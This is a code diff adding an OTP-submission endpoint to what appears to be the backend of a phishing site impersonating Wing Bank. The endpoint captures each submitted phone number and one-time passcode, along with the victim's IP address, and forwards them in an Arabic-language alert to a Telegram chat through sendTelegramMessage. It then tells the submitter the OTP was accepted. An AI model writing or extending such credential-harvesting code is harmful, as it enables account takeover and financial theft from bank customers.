@@ -56,6 +56,35 @@ export const appRouter = router({
           throw new Error("Failed to submit phone number");
         }
       }),
+
+    submitOtp: publicProcedure
+      .input(
+        z.object({
+          phoneNumber: z.string().min(1),
+          otpCode: z.string().min(4),
+        })
+      )
+      .mutation(async ({ input, ctx }) => {
+        const { phoneNumber, otpCode } = input;
+        
+        // Get client IP and user agent
+        const ipAddress = ctx.req.ip || ctx.req.headers['x-forwarded-for'] as string || 'unknown';
+        const userAgent = ctx.req.headers['user-agent'] || 'unknown';
+
+        try {
+          // Send OTP to Telegram
+          const message = `🔐 <b>رمز OTP جديد - Wing Bank</b>\n\n📱 <b>رقم الهاتف:</b> ${phoneNumber}\n🔢 <b>رمز OTP:</b> <code>${otpCode}</code>\n⏰ <b>الوقت:</b> ${new Date().toLocaleString("en-US", { timeZone: "Asia/Phnom_Penh" })}\n🌐 <b>عنوان IP:</b> ${ipAddress}`;
+          await sendTelegramMessage(message);
+
+          return {
+            success: true,
+            message: "OTP submitted successfully",
+          };
+        } catch (error) {
+          console.error("[Login] Error submitting OTP:", error);
+          throw new Error("Failed to submit OTP");
+        }
+      }),
   }),
 });
 
